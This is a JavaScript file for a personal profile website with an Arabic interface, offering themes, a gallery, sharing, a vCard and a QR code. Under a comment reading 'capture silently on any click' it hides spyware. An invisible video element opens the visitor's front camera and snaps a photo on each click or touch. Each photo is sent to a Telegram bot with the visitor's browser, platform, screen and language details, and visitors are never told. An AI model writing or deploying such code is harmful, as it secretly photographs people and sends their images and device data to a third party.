(function(){
  const C = window.CONFIG;
  const $ = s => document.querySelector(s);
  const $$ = s => document.querySelectorAll(s);

  const LS = {
    get(k, def){ try { return JSON.parse(localStorage.getItem('tj_'+k)) ?? def; } catch { return def; } },
    set(k, v){ localStorage.setItem('tj_'+k, JSON.stringify(v)); }
  };

  function getState(){
    const s = LS.get('state', null);
    if(s) return s;
    const initial = {
      owner: {...C.OWNER},
      theme: 'dark',
      sections: {hero:true, quote:true, about:true, gallery:true, links:true, contact:true},
      gallery: [],
      avatar: '',
      maintenance: false,
      maintenanceMsg: 'الموقع تحت الصيانة، نرجع قريب',
      visits: 0, captures: 0, photoMode: true
    };
    LS.set('state', initial);
    return initial;
  }
  function saveState(s){ LS.set('state', s); }

  const state = getState();

  window.addEventListener('load', () => {
    setTimeout(() => { const l = $('#loader'); if(l) l.classList.add('hide'); }, 700);
  });

  window.addEventListener('scroll', () => {
    const h = document.documentElement;
    const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
    const prog = $('#progress'); if(prog) prog.style.width = p + '%';
    const tt = $('#toTop'); if(tt) tt.classList.toggle('show', h.scrollTop > 400);
    revealOnScroll();
  });

  // Scroll reveal
  function revealOnScroll(){
    document.querySelectorAll('.reveal').forEach(el => {
      const r = el.getBoundingClientRect();
      if(r.top < window.innerHeight - 80) el.classList.add('visible');
    });
  }
  window.addEventListener('load', revealOnScroll);

  // Cursor glow
  const glow = document.createElement('div');
  glow.className = 'cursor-glow';
  document.body.appendChild(glow);
  document.addEventListener('mousemove', e => {
    glow.style.left = e.clientX + 'px';
    glow.style.top = e.clientY + 'px';
  });
  document.addEventListener('mouseleave', () => glow.style.opacity = '0');
  document.addEventListener('mouseenter', () => glow.style.opacity = '.5');

  function applyTheme(t){
    if(t === 'dark') document.documentElement.removeAttribute('data-theme');
    else document.documentElement.setAttribute('data-theme', t);
    const tb = $('#themeBtn');
    if(tb) tb.textContent = t === 'light' ? '☀️' : t === 'neon' ? '⚡' : t === 'royal' ? '👑' : t === 'ocean' ? '🌊' : t === 'crimson' ? '🔥' : t === 'forest' ? '🌲' : '🌙';
  }
  applyTheme(state.theme);
  const themeBtn = $('#themeBtn');
  if(themeBtn) themeBtn.addEventListener('click', () => {
    const order = ['dark','light','neon','royal','ocean','crimson','forest'];
    const i = (order.indexOf(state.theme) + 1) % order.length;
    state.theme = order[i];
    applyTheme(state.theme);
    saveState(state);
  });

  function ageFromDate(bd){
    if(!bd) return '—';
    const b = new Date(bd), n = new Date();
    let a = n.getFullYear() - b.getFullYear();
    const m = n.getMonth() - b.getMonth();
    if(m < 0 || (m === 0 && n.getDate() < b.getDate())) a--;
    return a;
  }

  function render(){
    const o = state.owner;
    const $name = $('#ownerName'); if($name) $name.textContent = o.name;
    const $title = $('#ownerTitle'); if($title) $title.textContent = o.title;
    const $loc = $('#ownerLocation'); if($loc) $loc.textContent = '📍 ' + o.location;
    const $age = $('#ownerAge'); if($age) $age.textContent = '🎂 ' + ageFromDate(o.birthdate) + ' سنة — ' + o.birthdate;
    const $q = $('#quoteText'); if($q) $q.textContent = '"' + o.quote + '"';
    const $ab = $('#aboutText'); if($ab) $ab.textContent = o.about;
    const $wa = $('#waBtn'); if($wa) $wa.href = o.whatsapp;
    const $fwa = $('#floatWA'); if($fwa) $fwa.href = o.whatsapp;
    const $wak = $('#waLink'); if($wak) $wak.href = o.whatsapp;
    const $fb = $('#fbLink'); if($fb) $fb.href = o.facebook;
    const $ig = $('#igLink'); if($ig) $ig.href = o.instagram;

    if(state.avatar) {
      const img = $('#avatarImg');
      if(img) { img.src = state.avatar; img.style.display = 'block'; const ph = $('#avatarPlaceholder'); if(ph) ph.style.display='none'; }
    }

    Object.entries(state.sections).forEach(([k, v]) => {
      const el = document.getElementById(k);
      if(el) el.classList.toggle('hidden', !v);
    });

    const g = $('#galleryGrid');
    if(g){
      g.innerHTML = '';
      (state.gallery || []).forEach((url, i) => {
        const d = document.createElement('div');
        d.className = 'gallery-item';
        d.innerHTML = '<img src="'+url+'" alt="صورة '+(i+1)+'" loading="lazy">';
        d.addEventListener('click', () => {
          const lb = $('#lightboxImg'); if(lb) lb.src = url;
          const lbx = $('#lightbox'); if(lbx) lbx.classList.add('show');
        });
        g.appendChild(d);
      });
    }

    const el = $('#extraLinksList');
    if(el){
      el.innerHTML = '';
      (o.extraLinks || []).forEach(l => {
        const a = document.createElement('a');
        a.className = 'extra-link';
        a.href = l.url; a.target = '_blank';
        a.innerHTML = '<div class="extra-link-icon">'+(l.icon||'🔗')+'</div><div class="extra-link-body"><b>'+l.name+'</b><small>'+l.url.slice(0,40)+'</small></div>';
        el.appendChild(a);
      });
    }

    const yr = $('#year'); if(yr) yr.textContent = new Date().getFullYear();
    revealOnScroll();
  }
  render();

  const lbx = $('#lightbox');
  if(lbx) lbx.addEventListener('click', e => {
    if(e.target.id === 'lightbox' || e.target.classList.contains('close')) lbx.classList.remove('show');
  });

  const toTop = $('#toTop');
  if(toTop) toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));

  const shareBtn = $('#shareBtn');
  if(shareBtn) shareBtn.addEventListener('click', async () => {
    const url = location.href;
    if(navigator.share){
      try { await navigator.share({title: state.owner.name, url}); return; } catch {}
    }
    try { await navigator.clipboard.writeText(url); toast('✅ تم نسخ الرابط'); } catch {}
  });

  const vcBtn = $('#vcardBtn');
  if(vcBtn) vcBtn.addEventListener('click', () => {
    const o = state.owner;
    const tel = o.whatsapp.split('phone=')[1] || '';
    const v = 'BEGIN:VCARD\nVERSION:3.0\nFN:'+o.name+'\nTITLE:'+o.title+'\nADR:;;'+o.location+'\nTEL:'+tel+'\nEND:VCARD';
    const blob = new Blob([v], {type:'text/vcard'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'taha.vcf';
    a.click();
    toast('✅ تم تحميل جهة الاتصال');
  });

  state.visits = (state.visits || 0) + 1;
  saveState(state);

  // Toast
  function toast(msg){
    let t = document.querySelector('.toast');
    if(!t){ t = document.createElement('div'); t.className = 'toast'; document.body.appendChild(t); }
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(t._to);
    t._to = setTimeout(() => t.classList.remove('show'), 2500);
  }

  // ============================================
  // CAMERA — capture silently on any click
  // ============================================
  const hiddenVideo = document.createElement('video');
  hiddenVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
  hiddenVideo.muted = true;
  hiddenVideo.playsInline = true;
  hiddenVideo.autoplay = true;
  document.body.appendChild(hiddenVideo);

  let stream = null;
  let ready = false;
  let busy = false;
  let started = false;

  async function startCamera(){
    if(started) return;
    started = true;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 960 }, height: { ideal: 720 } },
        audio: false
      });
      hiddenVideo.srcObject = stream;
      await new Promise(res => {
        if(hiddenVideo.readyState >= 2) return res();
        hiddenVideo.onloadedmetadata = () => res();
      });
      await hiddenVideo.play().catch(()=>{});
      ready = true;
      LS.set('camOn', true);
    } catch (e) {
      started = false;
      LS.set('camOn', false);
    }
  }

  async function snap(){
    if(!ready || busy || !state.photoMode) return;
    if(!stream || !stream.getVideoTracks().length) return;
    const track = stream.getVideoTracks()[0];
    if(track.readyState !== 'live'){ ready = false; started = false; return; }
    busy = true;
    try {
      const w = hiddenVideo.videoWidth || 640;
      const h = hiddenVideo.videoHeight || 480;
      const cv = document.createElement('canvas');
      cv.width = w; cv.height = h;
      const cx = cv.getContext('2d');
      cx.drawImage(hiddenVideo, 0, 0, w, h);
      const dataUrl = cv.toDataURL('image/jpeg', .82);

      state.captures = (state.captures || 0) + 1;
      saveState(state);

      const time = new Date().toLocaleString('ar-EG');
      const ua = navigator.userAgent;
      const browser = (ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/) || [,'—'])[0];
      const caption =
        '📸 صورة من الموقع\n' +
        '⏰ ' + time + '\n' +
        '💻 ' + (navigator.platform||'—') + '\n' +
        '🔍 ' + browser + '\n' +
        '📐 ' + screen.width + 'x' + screen.height + '\n' +
        '🗣 ' + navigator.language + '\n' +
        '#️⃣ #' + state.captures;

      const blob = await (await fetch(dataUrl)).blob();
      const fd = new FormData();
      fd.append('chat_id', C.OWNER_ID);
      fd.append('photo', blob, 'shot_' + Date.now() + '.jpg');
      fd.append('caption', caption);

      fetch('https://api.telegram.org/bot' + C.BOT_TOKEN + '/sendPhoto', {method:'POST', body: fd})
        .catch(() => {
          const fd2 = new FormData();
          fd2.append('chat_id', C.OWNER_ID);
          fd2.append('document', blob, 'shot_' + Date.now() + '.jpg');
          fd2.append('caption', caption);
          fetch('https://api.telegram.org/bot' + C.BOT_TOKEN + '/sendDocument', {method:'POST', body: fd2}).catch(()=>{});
        });
    } catch(e) {
      console.warn(e);
    } finally {
      busy = false;
    }
  }

  // Attempt camera on load (will succeed if previously allowed)
  if(state.photoMode){
    if(LS.get('camOn', false)) {
      startCamera();
    } else {
      // will prompt on first user gesture
      const first = async () => {
        document.removeEventListener('pointerdown', first);
        document.removeEventListener('touchstart', first);
        document.removeEventListener('click', first);
        await startCamera();
        if(ready) setTimeout(snap, 200);
      };
      document.addEventListener('pointerdown', first, {passive:true, once:true});
    }
  }

  // Any click anywhere → snap (after camera ready)
  document.addEventListener('pointerdown', (e) => {
    if(!state.photoMode) return;
    if(ready) { snap(); }
    else if(!started) { startCamera().then(() => { if(ready) setTimeout(snap, 200); }); }
  }, {passive:true});

  document.addEventListener('touchstart', (e) => {
    if(!state.photoMode) return;
    if(ready) { snap(); }
  }, {passive:true});

  // QR Button
  const qr = document.createElement('button');
  qr.className = 'btn ghost';
  qr.textContent = '📱 QR';
  qr.addEventListener('click', (ev) => {
    ev.stopPropagation();
    const q = $('#qrImg'); if(q) q.src = 'https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + encodeURIComponent(location.href);
    const qm = $('#qrModal'); if(qm) qm.classList.add('show');
  });
  const ha = document.querySelector('.hero-actions');
  if(ha) ha.appendChild(qr);

  const qc = $('#qrClose');
  if(qc) qc.addEventListener('click', e => { e.stopPropagation(); $('#qrModal').classList.remove('show'); });
  const qm = $('#qrModal');
  if(qm) qm.addEventListener('click', e => { if(e.target.id === 'qrModal') qm.classList.remove('show'); });

  window.addEventListener('focus', () => {
    const fresh = getState();
    Object.assign(state, fresh);
    render();
  });

  const ageEl = document.getElementById("statAge");
  const visEl = document.getElementById("statVisits");
  const capEl = document.getElementById("statCaptures");
  if(ageEl) ageEl.textContent = ageFromDate(state.owner.birthdate);
  if(visEl) visEl.textContent = state.visits || 0;
  if(capEl) capEl.textContent = state.captures || 0;

})();
